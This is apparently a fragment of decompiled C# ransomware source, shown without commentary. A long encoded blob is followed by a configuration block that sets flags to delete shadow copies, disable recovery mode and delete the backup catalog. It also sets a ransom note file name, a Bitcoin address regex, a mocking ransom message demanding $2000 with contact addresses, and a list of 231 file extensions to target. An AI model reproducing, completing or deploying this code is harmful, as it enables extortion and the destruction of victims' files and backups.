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[...string is too long...]";
		appMutexStartup = "1qw0ll8p9m8uezhqhyd";
		droppedMessageTextbox = "read it!!.txt";
		checkAdminPrivilage = true;
		checkdeleteShadowCopies = true;
		checkdisableRecoveryMode = true;
		checkdeleteBackupCatalog = true;
		appMutexStartup2 = "17CqMQFeuB3NTzJ";
		appMutex2 = appMutexStartup2 + appMutexRun2;
		staticSplit = "bc";
		appMutex = staticSplit + appMutexStartup + appMutexRun;
		appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");
		messages = new string[41]
		{
			"I'm from an international wanted u can call me : KiRa", "", "", "I am an undercover hacker", "", "", "My name is: GreatKiRa", "", "", "I will use your computer as collateral for collection",
			"", "", "i just want：2000$ LoL", "", "", "Payment address: b_@mail2tor.com", "", "", "contact details : b_@mail2tor.com", "",
			"", "IG: @DD00", "", "", "", "", "Hehh .. i think u are in big trouble $:", "sO Contact me after payment and I will unlock it for you", "If you do not pay, your computer and files will be automatically destroyed,", "",
			"", "", "", "", "", " ", "", "", "", "",
			""
		};
		validExtensions = new string[231]
		{
			".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
			".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
			".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
			".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
			".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
			".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
			".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
			".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
			".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
			".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
			".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
			".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
			".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
			".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
			".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
			".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
			".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
			".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
			".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
			".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
			".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
			".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
			".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d", ".dll",
			".exe"
		};
		random = new Random();
	}
}
